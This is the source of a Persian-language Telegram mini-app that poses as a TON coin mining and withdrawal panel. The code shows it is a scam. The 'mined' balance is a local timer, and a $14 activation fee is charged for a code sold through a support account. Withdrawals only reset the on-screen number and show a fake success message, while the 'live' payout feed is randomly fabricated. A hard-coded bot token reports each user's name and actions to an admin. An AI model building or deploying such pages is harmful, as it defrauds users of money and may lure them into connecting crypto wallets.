<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TonPlusBot - v50.1 Refined</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;900&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
        }

        /* --- اعلان شناور شیشه‌ای جدید --- */
        #glassToast {
            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
            background: rgba(0, 198, 255, 0.15); 
            backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff; padding: 12px 25px; border-radius: 50px;
            font-size: 13px; font-weight: bold; z-index: 200000;
            transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            display: flex; align-items: center; gap: 10px; width: max-content;
        }
        #glassToast.show { top: 30px; }
        /* ------------------------------- */

        .price-bar {
            background: rgba(0, 198, 255, 0.08); border-bottom: 1px solid #242c37;
            margin: -15px -15px 15px -15px; padding: 10px 18px; font-size: 11px;
            display: flex; justify-content: space-between; color: #00c6ff;
        }

        .card-profile {
            background: #161d27; border-radius: 20px; padding: 15px;
            margin-bottom: 12px; border: 1px solid #242c37;
            display: flex; align-items: center; justify-content: flex-start; gap: 15px;
        }
        .profile-text { text-align: right; flex-grow: 1; order: 1; }
        .avatar-container { 
            width: 60px; height: 60px; border-radius: 50%; 
            background: linear-gradient(135deg, #00c6ff, #0072ff); overflow: hidden;
            display: flex; align-items: center; justify-content: center;
            border: 2px solid #242c37; flex-shrink: 0; order: 2;
        }

        .card {
            background: #161d27; border-radius: 20px; padding: 22px;
            margin-bottom: 12px; border: 1px solid #242c37; text-align: center;
            position: relative; overflow: hidden;
        }
        #balance { font-size: 45px; font-weight: 900; color: #00c6ff; display: block; margin: 5px 0; }

        .btn {
            width: 100%; height: 58px; border-radius: 20px; border: none;
            font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
            align-items: center; justify-content: center; gap: 10px; color: #fff; 
            text-decoration: none; margin-bottom: 12px;
        }

        #ton-connect-btn * { 
            width: 100% !important; height: 58px !important; 
            border-radius: 20px !important; background-color: #0088cc !important;
        }

        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
        .support-btn { background: #1c2431; border: 1px solid #333; }

        .recent-activity { background: rgba(22, 29, 39, 0.6); border-radius: 20px; padding: 15px; font-size: 11px; border: 1px solid #242c37; color: #ddd; margin-top: 15px; }

        /* مودال فعالسازی */
        #feeModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center; }
        .modal-content { background: #1c1c1c; padding: 30px 18px; border-radius: 30px; width: 92%; text-align: center; border: 1px solid #333; }
        .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; }
        #activationInput { width: 100%; height: 58px; border-radius: 20px; background: #121212; color: #fff; text-align: center; margin-bottom: 12px; border: 1px solid #333; outline: none; }
        
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div id="glassToast">
    <i class="fas fa-check-circle" style="color: #00ff9d;"></i>
    <span id="toastContent"></span>
</div>

<div id="feeModal">
    <div class="modal-content">
        <i class="fas fa-lock" style="font-size: 60px; color: #ff512f; margin-bottom: 25px;"></i>
        <h2>فعالسازی پنل کاربری</h2>
        <div class="fee-tag">14 دلار | 2,226,000 تومان</div>
        <input type="text" id="activationInput" placeholder="Enter Activation Code">
        <button onclick="verifyActivation()" class="btn" style="background:#1faa59">فعالسازی و ورود</button>
        <a href="https://t.me/miningertoncoin" class="btn support-btn" style="margin-top:10px;">دریافت کد از پشتیبانی</a>
    </div>
</div>

<div class="price-bar">
    <span>TON: <b id="tonPrice">$5.40</b></span>
    <span>شبکه: <b style="color:#00ff9d">پایدار</b></span>
</div>

<div class="card-profile">
    <div class="profile-text"><h3 id="uName">TON USER</h3><p id="uTag">@username</p></div>
    <div class="avatar-container"><i class="fas fa-user-circle" style="font-size: 30px;"></i></div>
</div>

<div class="card">
    <div style="position:absolute; top:12px; left:12px; background:#1faa59; color:#fff; font-size:10px; padding:4px 10px; border-radius:12px; font-weight:bold;" id="uLevel">سطح: رایگان</div>
    <p style="margin:0; font-size:13px; color:#aaa;">موجودی استخراج شده (TON)</p>
    <span id="balance">0.000000</span>
</div>

<div class="card"><div id="ton-connect-btn"></div></div>

<div style="padding: 0 5px;">
    <button id="withdrawBtn" class="btn withdraw-btn"><i class="fas fa-arrow-up-from-bracket"></i> درخواست برداشت آنی</button>
    <a href="https://t.me/miningertoncoin" class="btn support-btn"><i class="fas fa-headset"></i> پشتیبانی آنلاین</a>
</div>

<div class="recent-activity">
    <div style="color:#00c6ff; font-weight:bold; margin-bottom:10px;"><i class="fas fa-satellite-dish"></i> گزارش زنده شبکه</div>
    <div id="activityList"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready(); tg.expand();

    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";

    function notifyAdmin(msg) {
        const u = tg.initDataUnsafe?.user;
        const text = encodeURIComponent(`👤 ${u?.first_name}\n📍 گزارش: ${msg}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${text}`);
    }

    // تابع نمایش پیام شناور شیشه‌ای
    function showGlassToast(text) {
        const toast = document.getElementById('glassToast');
        document.getElementById('toastContent').innerText = text;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 4500);
    }

    let bal = parseFloat(localStorage.getItem('bal_v50_update')) || 0;

    // کسر موجودی و نمایش اعلان
    document.getElementById('withdrawBtn').onclick = () => {
        if(localStorage.getItem('isActivated') !== 'true') return tg.showAlert("ابتدا پنل را فعالسازی کنید");
        
        if(bal <= 0) return tg.showAlert("موجودی برای برداشت کافی نیست");

        const amountToWithdraw = bal;
        
        // گزارش به ادمین
        notifyAdmin(`💰 درخواست برداشت\nمقدار: ${amountToWithdraw.toFixed(6)} TON`);
        
        // کسر موجودی و ذخیره
        bal = 0;
        document.getElementById('balance').innerText = "0.000000";
        localStorage.setItem('bal_v50_update', "0");

        // نمایش اعلان شیشه‌ای
        showGlassToast(`مقدار ${amountToWithdraw.toFixed(6)} تون برداشت شد`);
    };

    function verifyActivation() {
        if(document.getElementById('activationInput').value.trim() === "T61O96N12") {
            localStorage.setItem('isActivated', 'true');
            document.getElementById('feeModal').remove();
            notifyAdmin("✅ فعالسازی موفقیت‌آمیز");
        } else { tg.showAlert("کد نامعتبر است"); }
    }

    if(localStorage.getItem('isActivated') === 'true') document.getElementById('feeModal').remove();

    const u = tg.initDataUnsafe?.user;
    if (u) {
        document.getElementById('uName').innerText = u.first_name;
        document.getElementById('uTag').innerText = "@" + (u.username || u.id);
    }

    // تایمر استخراج
    setInterval(() => {
        bal += 0.000014;
        document.getElementById('balance').innerText = bal.toFixed(6);
        localStorage.setItem('bal_v50_update', bal.toString());
    }, 1000);

    new TON_CONNECT_UI.TonConnectUI({ manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json', buttonRootId: 'ton-connect-btn' });
    
    // گزارش زنده تزیینی
    function addActivity() {
        const list = document.getElementById('activityList');
        const items = ["Sina_Pro", "Eli_Crypto", "Morteza", "User_882"];
        const user = items[Math.floor(Math.random()*items.length)];
        const el = `<div style="display:flex; justify-content:space-between; margin-bottom:5px; font-size:10px;"><span>${user} برداشت موفق:</span> <span style="color:#00ff9d">${(Math.random()*5).toFixed(2)} TON</span></div>`;
        list.innerHTML = el + list.innerHTML;
        if(list.children.length > 3) list.removeChild(list.lastChild);
        setTimeout(addActivity, 8000);
    }
    addActivity();
</script>
</body>
</html>
